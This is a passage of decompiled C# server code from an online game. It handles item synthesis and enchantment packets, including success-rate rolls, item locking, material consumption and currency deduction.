							if (装备栏包裹[num30].Get物品ID == 800000061 && ((value137.FLD_RESIDE2 != 4) ? true : false))
							{
								合成提示(num, 5, 0, 装备栏包裹[num30]);
								break;
							}
							if (装备栏包裹[num30].Get物品ID != 800000062 || value137.FLD_RESIDE2 != 4)
							{
								goto IL_130cb;
							}
							合成提示(num, 5, 0, 装备栏包裹[num30]);
						}
						else if (装备栏包裹[num60].Get物品ID == 1008000137)
						{
							if (装备栏包裹[num30].Get物品ID != 800000023 && ((装备栏包裹[num30].Get物品ID != 800000024) ? true : false))
							{
								合成提示(num, 5, 0, 装备栏包裹[num30]);
								break;
							}
							if (装备栏包裹[num30].Get物品ID == 800000023 && ((value137.FLD_RESIDE2 != 4) ? true : false))
							{
								合成提示(num, 5, 0, 装备栏包裹[num30]);
								break;
							}
							if (装备栏包裹[num30].Get物品ID != 800000024 || value137.FLD_RESIDE2 != 4)
							{
								goto IL_130cb;
							}
							合成提示(num, 5, 0, 装备栏包裹[num30]);
						}
						else if (装备栏包裹[num60].Get物品ID == 1008001078)
						{
							if (装备栏包裹[num30].Get物品ID == 800000013)
							{
								goto IL_130cb;
							}
							合成提示(num, 5, 0, 装备栏包裹[num30]);
						}
						else
						{
							合成提示(num, 5, 0, 装备栏包裹[num30]);
						}
						goto end_IL_12ad5;
						IL_130cb:
						if (!合成物品表.ContainsKey(2))
						{
							合成物品表.TryAdd(2, new HcItimesClass
							{
								位置 = num30,
								物品 = 装备栏包裹[num30].物品_byte
							});
							装备栏包裹[num30].锁定 = true;
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
						end_IL_12ad5:;
					}
					catch (Exception ex55)
					{
						MainForm.WriteLine(1, "合成系统 合成属性 合成2 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex55.Message);
					}
					break;
				case 143:
					try
					{
						if (合成物品表.Count == 0)
						{
							合成提示(num, 5, 0, 装备栏包裹[num30]);
						}
						else if (!合成物品表.ContainsKey(3))
						{
							合成物品表.TryAdd(3, new HcItimesClass
							{
								位置 = num30,
								物品 = 装备栏包裹[num30].物品_byte
							});
							装备栏包裹[num30].锁定 = true;
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex106)
					{
						MainForm.WriteLine(1, "合成系统 合成属性 合成3 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex106.Message);
					}
					break;
				case 148:
				case 149:
					try
					{
						if (合成物品表.TryGetValue(1, out var value32))
						{
							装备栏包裹[value32.位置].锁定 = false;
							合成提示(num, 1, 0, 装备栏包裹[value32.位置]);
						}
						合成物品表.Clear();
						合成系统解锁();
						元宝合成开关 = 0;
						打开仓库中 = false;
					}
					catch (Exception ex108)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 合成属性 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex108.Message);
					}
					break;
				case 150:
					try
					{
						if (合成物品表.Count <= 0)
						{
							break;
						}
						HcItimesClass hcItimesClass130 = null;
						HcItimesClass hcItimesClass132 = null;
						HcItimesClass hcItimesClass133 = null;
						if (合成物品表.ContainsKey(1))
						{
							hcItimesClass130 = 合成物品表[1];
						}
						if (合成物品表.ContainsKey(2))
						{
							hcItimesClass132 = 合成物品表[2];
						}
						if (合成物品表.ContainsKey(3))
						{
							hcItimesClass133 = 合成物品表[3];
						}
						ItmeClass value27 = new ItmeClass();
						if (BitConverter.ToInt64(装备栏包裹[hcItimesClass130.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass130.物品全局ID, 0) || BitConverter.ToInt64(装备栏包裹[hcItimesClass132.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass132.物品全局ID, 0) || (hcItimesClass133 != null && BitConverter.ToInt64(装备栏包裹[hcItimesClass133.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass133.物品全局ID, 0)) || ((!World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass130.物品id, 0), out value27)) ? true : false))
						{
							break;
						}
						if (value27.FLD_RESIDE2 != 1 && ((value27.FLD_RESIDE2 != 4) ? true : false))
						{
							string[] array9 = new string[5] { "合成系统 强化 BUG1[", null, null, null, null };
							array9[1] = BitConverter.ToInt32(hcItimesClass130.物品id, 0).ToString();
							array9[2] = "]-[";
							array9[3] = BitConverter.ToInt32(hcItimesClass132.物品id, 0).ToString();
							array9[4] = "]";
							MainForm.WriteLine(6, string.Concat(array9));
							break;
						}
						if (装备栏包裹[hcItimesClass130.位置].物品绑定)
						{
							合成提示(num, 2, 0, 装备栏包裹[hcItimesClass130.位置]);
							break;
						}
						double num90 = RNG.Next(0, 100);
						double num91 = hcItimesClass130.FLD_FJ_觉醒 * 20;
						if (hcItimesClass130.FLD_FJ_觉醒 >= 5)
						{
							合成物品表.Clear();
							合成提示(num, 6, 0, 装备栏包裹[num30]);
							合成系统解锁();
							元宝合成开关 = 0;
							break;
						}
						if (hcItimesClass133 != null)
						{
							num90 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass133.物品id, 0));
						}
						if (元宝合成开关 == 1)
						{
							num90 += 5.0;
						}
						if (base.FLD_VIP == 1)
						{
							num90 += World.VIP合成率增加百分比;
						}
						if (World.附魂率 != 0.0)
						{
							num90 += 100.0 * World.附魂率;
						}
						if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
						{
							num90 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
						}
						if (base.FLD_装备_追加_合成成功率百分比 > 0.0)
						{
							num90 += 100.0 * base.FLD_装备_追加_合成成功率百分比 / 2.0;
						}
						if (GM模式 == 8)
						{
							num91 = 0.0;
						}
						if (num90 >= num91)
						{
							hcItimesClass130.FLD_FJ_觉醒++;
							合成提示(num, 1, 0, 装备栏包裹[hcItimesClass130.位置]);
							RxjhClass.合成记录(base.Userid, base.UserName, value27.ItmeNAME, num, "附魂", "成功", 装备栏包裹[hcItimesClass130.位置]);
						}
						else
						{
							RxjhClass.合成记录(base.Userid, base.UserName, value27.ItmeNAME, num, "附魂", "失败", 装备栏包裹[hcItimesClass130.位置]);
							合成提示(num, 0, 0, 装备栏包裹[hcItimesClass130.位置]);
						}
						减去物品(hcItimesClass132.位置, 1);
						if (hcItimesClass133 != null)
						{
							减去物品(hcItimesClass133.位置, 1);
						}
						if (BitConverter.ToInt32(装备栏包裹[hcItimesClass130.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass130.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass130.物品全局ID, 0)) ? true : false))
						{
							减去物品(hcItimesClass130.位置, 1);
							增加物品(hcItimesClass130.物品全局ID, hcItimesClass130.物品id, hcItimesClass130.位置, hcItimesClass130.物品数量, hcItimesClass130.物品属性);
						}
						装备栏包裹[hcItimesClass130.位置].锁定 = false;
						合成物品表.Clear();
						合成系统解锁();
						元宝合成开关 = 0;
						打开仓库中 = false;
					}
					catch (Exception ex105)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 合成属性阶段 合成 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex105.Message);
					}
					break;
				case 151:
					try
					{
						if (base.当前操作类型 == 122 && 合成物品表.Count != 0 && 合成物品表.ContainsKey(2) && !合成物品表.ContainsKey(1) && !装备栏包裹[num30].物品绑定)
						{
							if (装备栏包裹[num30].FLD_FJ_觉醒 >= 5)
							{
								合成物品表.Clear();
								合成系统解锁();
								元宝合成开关 = 0;
								打开仓库中 = false;
								合成提示(num, 6, 0, 装备栏包裹[num30]);
							}
							else
							{
								HcItimesClass hcItimesClass52 = new HcItimesClass();
								hcItimesClass52.位置 = num30;
								hcItimesClass52.物品 = 装备栏包裹[num30].物品_byte;
								HcItimesClass value37 = hcItimesClass52;
								装备栏包裹[num30].锁定 = true;
								合成物品表.TryAdd(1, value37);
								合成提示(num, 1, 0, 装备栏包裹[num30]);
							}
						}
					}
					catch (Exception ex112)
					{
						MainForm.WriteLine(1, "合成系统 合成属性阶段 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex112.Message);
					}
					break;
				case 152:
					try
					{
						if (base.当前操作类型 != 122)
						{
							break;
						}
						if (BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 1000000365 && ((BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 1000000367) ? true : false))
						{
							合成提示(num, 5, 0, 装备栏包裹[num30]);
							break;
						}
						if (合成物品表.Count != 0)
						{
							合成物品表.Clear();
						}
						if (BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) == 1000000365 || BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) == 1000000367)
						{
							HcItimesClass hcItimesClass55 = new HcItimesClass();
							hcItimesClass55.位置 = num30;
							hcItimesClass55.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value33 = hcItimesClass55;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(2, value33);
							打开仓库中 = true;
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex110)
					{
						MainForm.WriteLine(1, "合成系统 合成属性阶段 合成2 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex110.Message);
					}
					break;
				case 153:
					try
					{
						if (合成物品表.Count != 0 && !合成物品表.ContainsKey(3))
						{
							HcItimesClass hcItimesClass57 = new HcItimesClass();
							hcItimesClass57.位置 = num30;
							hcItimesClass57.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value8 = hcItimesClass57;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(3, value8);
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex100)
					{
						MainForm.WriteLine(1, "合成系统 合成属性阶段 合成3 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex100.Message);
					}
					break;
				case 159:
					try
					{
						if (合成物品表.TryGetValue(1, out var value40))
						{
							装备栏包裹[value40.位置].锁定 = false;
							合成提示(num, 1, 0, 装备栏包裹[value40.位置]);
						}
						合成物品表.Clear();
						合成系统解锁();
						元宝合成开关 = 0;
						打开仓库中 = false;
					}
					catch (Exception ex115)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 合成属性阶段 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex115.Message);
					}
					break;
				case 160:
					try
					{
						byte[] array15 = new byte[4];
						Buffer.BlockCopy(封包数据, 14, array15, 0, 4);
						if (base.当前操作类型 != 138 || 合成物品表 == null || 合成物品表.Count <= 0)
						{
							break;
						}
						HcItimesClass hcItimesClass149 = null;
						HcItimesClass hcItimesClass150 = null;
						HcItimesClass hcItimesClass151 = null;
						if (合成物品表.ContainsKey(1))
						{
							hcItimesClass149 = 合成物品表[1];
						}
						if (合成物品表.ContainsKey(2))
						{
							hcItimesClass150 = 合成物品表[2];
						}
						if (合成物品表.ContainsKey(3))
						{
							hcItimesClass151 = 合成物品表[3];
						}
						if (BitConverter.ToInt64(装备栏包裹[hcItimesClass149.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass149.物品全局ID, 0))
						{
							合成提示(61, 5, 0, 装备栏包裹[hcItimesClass149.位置]);
							合成物品表.Clear();
						}
						else if (BitConverter.ToInt64(装备栏包裹[hcItimesClass150.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass150.物品全局ID, 0))
						{
							合成提示(61, 5, 0, 装备栏包裹[hcItimesClass150.位置]);
							合成物品表.Clear();
						}
						else if (hcItimesClass151 != null && BitConverter.ToInt64(装备栏包裹[hcItimesClass151.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass151.物品全局ID, 0))
						{
							合成提示(61, 5, 0, 装备栏包裹[hcItimesClass151.位置]);
							合成物品表.Clear();
						}
						else
						{
							if (!World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass149.物品id, 0), out var value48))
							{
								break;
							}
							if (value48.FLD_RESIDE2 != 1 && value48.FLD_RESIDE2 != 4)
							{
								合成提示(61, 5, 0, 装备栏包裹[hcItimesClass149.位置]);
								合成物品表.Clear();
								break;
							}
							if (装备栏包裹[hcItimesClass149.位置].物品绑定)
							{
								合成提示(num, 3, 0, 装备栏包裹[hcItimesClass149.位置]);
								合成物品表.Clear();
								break;
							}
							hcItimesClass149.强化属性阶段();
							hcItimesClass150.强化属性阶段();
							double num130 = RNG.Next(1, 40);
							double num131 = hcItimesClass149.阶段数量 * 10;
							if (hcItimesClass149.阶段数量 >= 10)
							{
								合成提示(61, 3, 0, 装备栏包裹[hcItimesClass149.位置]);
								合成物品表.Clear();
								break;
							}
							if (hcItimesClass151 != null)
							{
								num130 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass151.物品id, 0));
							}
							if (元宝合成开关 == 1)
							{
								num130 += 5.0;
							}
							if (公有药品.ContainsKey(1008000312))
							{
								num130 += 5.0;
							}
							if (base.FLD_VIP == 1)
							{
								num130 += 100.0 * World.VIP合成率增加百分比;
							}
							if (World.赋予属性率 != 0.0)
							{
								num130 += 100.0 * World.赋予属性率;
							}
							if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
							{
								num130 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
							}
							if (base.FLD_装备_追加_合成成功率百分比 != 0.0)
							{
								num130 += 100.0 * base.FLD_装备_追加_合成成功率百分比;
							}
							if ((hcItimesClass149.阶段数量 == 0 && num130 >= 100.0 - World.水晶赋予属性一阶段) || (hcItimesClass149.阶段数量 == 1 && num130 >= 100.0 - World.水晶赋予属性二阶段) || (hcItimesClass149.阶段数量 == 2 && num130 >= 100.0 - World.水晶赋予属性三阶段) || (hcItimesClass149.阶段数量 == 3 && num130 >= 100.0 - World.水晶赋予属性四阶段) || (hcItimesClass149.阶段数量 == 4 && num130 >= 100.0 - World.水晶赋予属性五阶段) || (hcItimesClass149.阶段数量 == 5 && num130 >= 100.0 - World.水晶赋予属性六阶段) || (hcItimesClass149.阶段数量 == 6 && num130 >= 100.0 - World.水晶赋予属性七阶段) || (hcItimesClass149.阶段数量 == 7 && num130 >= 100.0 - World.水晶赋予属性八阶段) || (hcItimesClass149.阶段数量 == 8 && num130 >= 100.0 - World.水晶赋予属性九阶段) || (hcItimesClass149.阶段数量 == 9 && num130 >= 100.0 - World.水晶赋予属性十阶段))
							{
								if (hcItimesClass149.阶段数量 != 0 && hcItimesClass150.阶段类型 != hcItimesClass149.阶段类型)
								{
									hcItimesClass149.阶段数量 = 0;
									hcItimesClass149.设置阶段属性();
									合成提示(num, 0, 0, 装备栏包裹[hcItimesClass149.位置]);
									RxjhClass.合成记录(base.Userid, base.UserName, value48.ItmeNAME, num, "上属性", "失败", 装备栏包裹[hcItimesClass149.位置]);
								}
								else
								{
									hcItimesClass149.阶段类型 = hcItimesClass150.阶段类型;
									Random random6 = new Random(DateTime.Now.Millisecond);
									hcItimesClass149.阶段数量 += random6.Next(1, 4);
									if (hcItimesClass149.阶段数量 > 10)
									{
										hcItimesClass149.阶段数量 = 10;
									}
									hcItimesClass149.设置阶段属性();
									合成提示(num, 1, 0, 装备栏包裹[hcItimesClass149.位置]);
									RxjhClass.合成记录(base.Userid, base.UserName, value48.ItmeNAME, num, "上属性", "成功", 装备栏包裹[hcItimesClass149.位置]);
								}
							}
							else
							{
								Random random7 = new Random(DateTime.Now.Millisecond);
								hcItimesClass149.阶段数量 -= random7.Next(0, 3);
								if (hcItimesClass149.阶段数量 < 0)
								{
									hcItimesClass149.阶段数量 = 0;
								}
								hcItimesClass149.设置阶段属性();
								合成提示(num, 0, 0, 装备栏包裹[hcItimesClass149.位置]);
							}
							减去物品(BitConverter.ToInt32(array15, 0), 1);
							减去物品(hcItimesClass150.位置, 1);
							if (hcItimesClass151 != null)
							{
								减去物品(hcItimesClass151.位置, 1);
							}
							if (BitConverter.ToInt32(装备栏包裹[hcItimesClass149.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass149.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass149.物品全局ID, 0))
							{
								减去物品(hcItimesClass149.位置, 1);
								增加物品(hcItimesClass149.物品全局ID, hcItimesClass149.物品id, hcItimesClass149.位置, hcItimesClass149.物品数量, hcItimesClass149.物品属性);
							}
							装备栏包裹[hcItimesClass149.位置].锁定 = false;
							合成物品表.Clear();
							合成系统解锁();
							元宝合成开关 = 0;
							break;
						}
					}
					catch (Exception ex117)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 合成属性阶段 合成 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex117.Message);
					}
					break;
				case 161:
					try
					{
						if (base.当前操作类型 != 138)
						{
							break;
						}
						if (合成物品表.ContainsKey(1))
						{
							合成提示(num, 5, 0, 装备栏包裹[num30]);
						}
						else if (!装备栏包裹[num30].物品绑定 && 装备栏包裹[num30].FLD_属性数量 < 10)
						{
							if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0), out var value5) && value5.FLD_RESIDE2 != 1 && value5.FLD_RESIDE2 != 4)
							{
								合成提示(num, 5, 0, 装备栏包裹[num30]);
								break;
							}
							HcItimesClass hcItimesClass62 = new HcItimesClass();
							hcItimesClass62.位置 = num30;
							hcItimesClass62.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value6 = hcItimesClass62;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(1, value6);
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
						else
						{
							合成提示(num, 3, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex97)
					{
						MainForm.WriteLine(1, "合成系统 合成属性阶段 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex97.Message);
					}
					break;
				case 162:
					try
					{
						if (base.当前操作类型 == 138 && 合成物品表.Count != 0 && !合成物品表.ContainsKey(2))
						{
							HcItimesClass hcItimesClass63 = new HcItimesClass();
							hcItimesClass63.位置 = num30;
							hcItimesClass63.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value7 = hcItimesClass63;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(2, value7);
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex99)
					{
						MainForm.WriteLine(1, "合成系统 合成属性阶段 合成2 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex99.Message);
					}
					break;
				case 163:
					try
					{
						if (base.当前操作类型 == 138 && 合成物品表.Count != 0 && !合成物品表.ContainsKey(3))
						{
							HcItimesClass hcItimesClass64 = new HcItimesClass();
							hcItimesClass64.位置 = num30;
							hcItimesClass64.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value185 = hcItimesClass64;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(3, value185);
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex95)
					{
						MainForm.WriteLine(1, "合成系统 合成属性阶段 合成3 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex95.Message);
					}
					break;
				case 169:
					try
					{
						if (合成物品表.TryGetValue(1, out var value179))
						{
							装备栏包裹[value179.位置].锁定 = false;
							合成提示(num, 1, 0, 装备栏包裹[value179.位置]);
						}
						打开仓库中 = false;
						合成物品表.Clear();
						合成系统解锁();
						元宝合成开关 = 0;
					}
					catch (Exception ex86)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 合成属性阶段 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex86.Message);
					}
					break;
				case 170:
					try
					{
						if (合成物品表.Count <= 0)
						{
							break;
						}
						HcItimesClass hcItimesClass125 = null;
						if (!合成物品表.ContainsKey(1))
						{
							break;
						}
						HcItimesClass hcItimesClass126 = 合成物品表[1];
						if (!合成物品表.ContainsKey(2))
						{
							break;
						}
						HcItimesClass hcItimesClass127 = 合成物品表[2];
						if (合成物品表.ContainsKey(3))
						{
							hcItimesClass125 = 合成物品表[3];
						}
						if (!合成物品表.ContainsKey(4))
						{
							break;
						}
						HcItimesClass hcItimesClass128 = 合成物品表[4];
						ItmeClass value9 = new ItmeClass();
						if (BitConverter.ToInt64(装备栏包裹[hcItimesClass126.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass126.物品全局ID, 0) || BitConverter.ToInt64(装备栏包裹[hcItimesClass127.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass127.物品全局ID, 0) || BitConverter.ToInt64(装备栏包裹[hcItimesClass128.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass128.物品全局ID, 0) || (hcItimesClass125 != null && BitConverter.ToInt64(装备栏包裹[hcItimesClass125.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass125.物品全局ID, 0)) || ((!World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass126.物品id, 0), out value9)) ? true : false))
						{
							break;
						}
						if (value9.FLD_RESIDE2 != 1 && ((value9.FLD_RESIDE2 != 4) ? true : false))
						{
							string[] array8 = new string[5] { "合成系统 中级附魂 BUG1[", null, null, null, null };
							array8[1] = BitConverter.ToInt32(hcItimesClass126.物品id, 0).ToString();
							array8[2] = "]-[";
							array8[3] = BitConverter.ToInt32(hcItimesClass127.物品id, 0).ToString();
							array8[4] = "]";
							MainForm.WriteLine(6, string.Concat(array8));
						}
						else
						{
							if (value9.FLD_LEVEL < 80)
							{
								break;
							}
							if (装备栏包裹[hcItimesClass126.位置].物品绑定)
							{
								合成提示(num, 2, 0, 装备栏包裹[hcItimesClass126.位置]);
								break;
							}
							hcItimesClass127.强化属性阶段();
							double num87 = RNG.Next(80, 181);
							double num88 = hcItimesClass126.FLD_FJ_觉醒 * 20;
							if (hcItimesClass125 != null)
							{
								num87 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass125.物品id, 0));
							}
							if (元宝合成开关 == 1)
							{
								num87 += 5.0;
							}
							if (base.FLD_VIP == 1)
							{
								num87 += 100.0 * World.VIP合成率增加百分比;
							}
							if (World.中魂成功几率 != 0.0)
							{
								num87 += 100.0 * World.中魂成功几率;
							}
							if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
							{
								num87 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
							}
							if (base.FLD_装备_追加_合成成功率百分比 > 0.0)
							{
								num87 += 100.0 * base.FLD_装备_追加_合成成功率百分比 / 2.0;
							}
							if (num87 >= num88)
							{
								hcItimesClass126.FLD_FJ_中级附魂 = hcItimesClass127.阶段数量;
								减去物品(hcItimesClass126.位置, 1);
								增加物品(hcItimesClass126.物品全局ID, hcItimesClass126.物品id, hcItimesClass126.位置, hcItimesClass126.物品数量, hcItimesClass126.物品属性);
								if (hcItimesClass127 != null)
								{
									减去物品(hcItimesClass127.位置, 1);
								}
								if (hcItimesClass128 != null)
								{
									减去物品(hcItimesClass128.位置, 1);
								}
								if (hcItimesClass125 != null)
								{
									减去物品(hcItimesClass125.位置, 1);
								}
								装备栏包裹[hcItimesClass126.位置].锁定 = false;
								合成物品表.Clear();
								合成系统解锁();
								元宝合成开关 = 0;
								RxjhClass.合成记录(base.Userid, base.UserName, value9.ItmeNAME, num, "中级附魂", "成功", 装备栏包裹[hcItimesClass126.位置]);
								合成提示(num, 1, 0, 装备栏包裹[num30]);
							}
							else
							{
								if (hcItimesClass127 != null)
								{
									减去物品(hcItimesClass127.位置, 1);
								}
								if (hcItimesClass128 != null)
								{
									减去物品(hcItimesClass128.位置, 1);
								}
								if (hcItimesClass125 != null)
								{
									减去物品(hcItimesClass125.位置, 1);
								}
								装备栏包裹[hcItimesClass126.位置].锁定 = false;
								合成物品表.Clear();
								合成系统解锁();
								元宝合成开关 = 0;
								RxjhClass.合成记录(base.Userid, base.UserName, value9.ItmeNAME, num, "中级附魂", "失败", 装备栏包裹[hcItimesClass126.位置]);
								合成提示(num, 0, 0, 装备栏包裹[num30]);
							}
							break;
						}
					}
					catch (Exception ex101)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 中级附魂 合成 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex101.Message);
					}
					break;
				case 171:
					try
					{
						if (合成物品表.Count != 0 && 合成物品表.ContainsKey(4) && !合成物品表.ContainsKey(1) && World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0), out var value22) && (value22.FLD_RESIDE2 == 1 || value22.FLD_RESIDE2 == 4) && value22.FLD_LEVEL >= 80)
						{
							HcItimesClass hcItimesClass65 = new HcItimesClass();
							hcItimesClass65.位置 = num30;
							hcItimesClass65.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value23 = hcItimesClass65;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(1, value23);
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex103)
					{
						MainForm.WriteLine(1, "合成系统 中级附魂 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex103.Message);
					}
					break;
				case 172:
					try
					{
						if (合成物品表.Count == 0 || (合成物品表.ContainsKey(2) ? true : false))
						{
							break;
						}
						HcItimesClass hcItimesClass68 = new HcItimesClass();
						hcItimesClass68.位置 = num30;
						hcItimesClass68.物品 = 装备栏包裹[num30].物品_byte;
						HcItimesClass hcItimesClass112 = hcItimesClass68;
						hcItimesClass112.强化属性阶段();
						if (!合成物品表.ContainsKey(1))
						{
							break;
						}
						HcItimesClass hcItimesClass113 = 合成物品表[1];
						if (!World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass113.物品id, 0), out var value167))
						{
							goto IL_15a69;
						}
						if (value167.FLD_RESIDE2 == 4)
						{
							if (value167.FLD_LEVEL >= 80)
							{
								goto IL_15a69;
							}
							合成提示(num, 2, 0, 装备栏包裹[num30]);
							合成物品表.TryRemove(1, out hcItimesClass68);
						}
						else
						{
							if (value167.FLD_RESIDE2 != 1 || value167.FLD_LEVEL >= 80)
							{
								goto IL_15a69;
							}
							合成提示(num, 3, 0, 装备栏包裹[num30]);
							合成物品表.TryRemove(1, out hcItimesClass68);
						}
						goto end_IL_158b4;
						IL_15a69:
						装备栏包裹[num30].锁定 = true;
						合成物品表.TryAdd(2, hcItimesClass112);
						合成提示(num, 1, 0, 装备栏包裹[num30]);
						end_IL_158b4:;
					}
					catch (Exception ex78)
					{
						MainForm.WriteLine(1, "合成系统 中级附魂 合成2 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex78.Message);
					}
					break;
				case 173:
					try
					{
						if (合成物品表.Count != 0 && !合成物品表.ContainsKey(3))
						{
							HcItimesClass hcItimesClass67 = new HcItimesClass();
							hcItimesClass67.位置 = num30;
							hcItimesClass67.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value182 = hcItimesClass67;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(3, value182);
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex92)
					{
						MainForm.WriteLine(1, "合成系统 中级附魂 合成3 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex92.Message);
					}
					break;
				case 174:
					try
					{
						if (!合成物品表.ContainsKey(4) && BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) == 1000000330)
						{
							HcItimesClass hcItimesClass66 = new HcItimesClass();
							hcItimesClass66.位置 = num30;
							hcItimesClass66.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value180 = hcItimesClass66;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(4, value180);
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex89)
					{
						MainForm.WriteLine(1, "合成系统 中级附魂 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex89.Message);
					}
					break;
				case 179:
					try
					{
						合成物品表.Clear();
						合成系统解锁();
						元宝合成开关 = 0;
						打开仓库中 = false;
						合成提示(num, 1, 0, 装备栏包裹[num30]);
					}
					catch (Exception ex80)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 合成属性阶段 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex80.Message);
					}
					break;
				case 180:
				{
					if (合成物品表.Count <= 0 || ((!合成物品表.ContainsKey(1)) ? true : false))
					{
						break;
					}
					HcItimesClass hcItimesClass94 = null;
					HcItimesClass hcItimesClass95 = null;
					if (合成物品表.ContainsKey(1))
					{
						hcItimesClass94 = 合成物品表[1];
					}
					if (合成物品表.ContainsKey(2))
					{
						hcItimesClass95 = 合成物品表[2];
					}
					if (BitConverter.ToInt64(装备栏包裹[hcItimesClass94.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass94.物品全局ID, 0) || (hcItimesClass95 != null && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass95.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass95.物品全局ID, 0)) ? true : false)))
					{
						break;
					}
					if (World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass94.物品id, 0), out var value131))
					{
						if (value131.FLD_RESIDE2 != 7 && value131.FLD_RESIDE2 != 8 && ((value131.FLD_RESIDE2 != 10) ? true : false))
						{
							合成提示(num, 19, 0, 装备栏包裹[hcItimesClass94.位置]);
							合成物品表.Clear();
							break;
						}
						if (value131.FLD_UP_LEVEL == 0)
						{
							合成提示(num, 19, 0, 装备栏包裹[num30]);
							合成物品表.Clear();
							break;
						}
						if (value131.FLD_PID == 100026 || (value131.FLD_PID == 18 && ((value131.FLD_PID == 700911) ? true : false)))
						{
							合成提示(num, 19, 0, 装备栏包裹[num30]);
							合成物品表.Clear();
							break;
						}
						if (base.Player_Money < 10000000)
						{
							合成提示(11, 4, 10000000, 装备栏包裹[hcItimesClass94.位置]);
							合成物品表.Clear();
							break;
						}
						base.Player_Money -= 10000000L;
						更新金钱和负重();
